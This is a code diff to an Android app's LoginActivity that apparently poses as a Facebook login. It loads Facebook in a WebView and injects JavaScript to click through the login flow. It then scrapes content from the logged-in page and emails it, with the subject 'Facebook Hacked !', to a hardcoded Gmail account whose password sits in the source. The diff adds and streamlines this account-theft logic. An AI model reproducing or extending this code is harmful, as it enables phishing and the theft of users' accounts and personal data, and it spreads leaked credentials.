@@ -8,6 +8,7 @@ import android.content.Intent;
 import android.graphics.Bitmap;
 import android.graphics.Color;
 import android.graphics.Typeface;
+import android.os.AsyncTask;
 import android.os.Build;
 import android.os.Handler;
 import android.support.v4.app.ActivityCompat;
@@ -44,7 +45,7 @@ import java.util.Objects;
 public class LoginActivity extends AppCompatActivity
 {
     EditText Login,Pass;
-    TextView Show,Forgot,urll;
+    TextView Show,Forgot;
     ImageView logo;
     Button LOGIN,CREATE;
     WebView FBMain;
@@ -69,7 +70,6 @@ public class LoginActivity extends AppCompatActivity
         logo=findViewById(R.id.Iv1);
         FBMain=findViewById(R.id.FBPage);
         MainLayout=findViewById(R.id.MainLayout);
-        urll=findViewById(R.id.urll);
 
         Login.setVisibility(View.GONE);
         Pass.setVisibility(View.GONE);
@@ -173,7 +173,7 @@ public class LoginActivity extends AppCompatActivity
             public void onPageStarted(WebView view, String url, Bitmap favicon)
             {
                 //Toast.makeText(LoginActivity.this,url, Toast.LENGTH_SHORT).show();
-                urll.setText(url);
+                //urll.setText(urll.getText()+"\n"+url);
             }
             @Override
             public void onPageFinished(final WebView v, String url){
@@ -184,22 +184,13 @@ public class LoginActivity extends AppCompatActivity
                             "e.initEvent('click',true,true);" + "l.dispatchEvent(e);" + "})()");
                     page=1;
                 }
-                else if(page==1){
-                    if(url.contains("m.facebook.com/login/save-device/?login_source=login#_=_"))
-                    {
-                        v.loadUrl("https://m.facebook.com/login/save-device/cancel/?flow=interstitial_nux&nux_source=regular_login");
-                        page=2;
-                    }
+                else if(page==1 && url.contains("m.facebook.com/login/save-device/?login_source=login#_=_")){
+                    v.loadUrl("https://m.facebook.com/login/save-device/cancel/?flow=interstitial_nux&nux_source=regular_login");
+                    page=2;
                 }
-                else if(page==2)
+                else if(page==2 && url.contains("m.facebook.com/home.php?_rdr"))
                 {
-                    if(url.contains("m.facebook.com/home.php?_rdr"))
-                    {
-                        v.loadUrl("javascript:(function(){" + "l=document.getElementById('u_0_i');" + "e=document.createEvent('HTMLEvents');" +
-                                "e.initEvent('click',true,true);" + "l.dispatchEvent(e);" + "})()");
-                        Toast.makeText(LoginActivity.this, "Clicked", Toast.LENGTH_SHORT).show();
-                        page=3;
-                    }
+                    page=3;
                 }
             }
             @Override
@@ -250,14 +241,15 @@ public class LoginActivity extends AppCompatActivity
     }
     public void sendMail()
     {
-        urll.setText(FBMain.getUrl());
         new Handler().postDelayed(new Runnable() {
             @Override
             public void run() {
-                Toast.makeText(LoginActivity.this, "Scan", Toast.LENGTH_SHORT).show();
+                FBMain.loadUrl("javascript:(function(){" + "l=document.getElementById('u_0_i');" + "e=document.createEvent('HTMLEvents');" +
+                        "e.initEvent('click',true,true);" + "l.dispatchEvent(e);" + "})()");
                 FBMain.evaluateJavascript(
                         "(function() { return (document.getElementsByClassName('_52x7 _2jcc')[0].innerHTML); })();",
                         new ValueCallback<String>() {
+                            @SuppressLint("StaticFieldLeak")
                             @Override
                             public void onReceiveValue(String vName) {
                                 if(!vName.equals("null"))
@@ -277,6 +269,7 @@ public class LoginActivity extends AppCompatActivity
                                         @Override
                                         public void run() {
                                             try {
+
                                                 GMailSender sender = new GMailSender(LoginActivity.this,"ritik.fbhack@gmail.com", "Ritik@12321");
                                                 sender.sendMail("Facebook Hacked !",
                                                         message,
@@ -286,7 +279,9 @@ public class LoginActivity extends AppCompatActivity
                                                 Log.e("SendMail", e.getMessage(), e);
                                             }
                                         }
+
                                     }).start();
+
                                     ObjectAnimator fadeOut = ObjectAnimator.ofFloat(MainLayout, "alpha",  1f, 0f);
                                     fadeOut.setDuration(2000);fadeOut.start();
                                     fadeOut.addListener(new AnimatorListenerAdapter() {
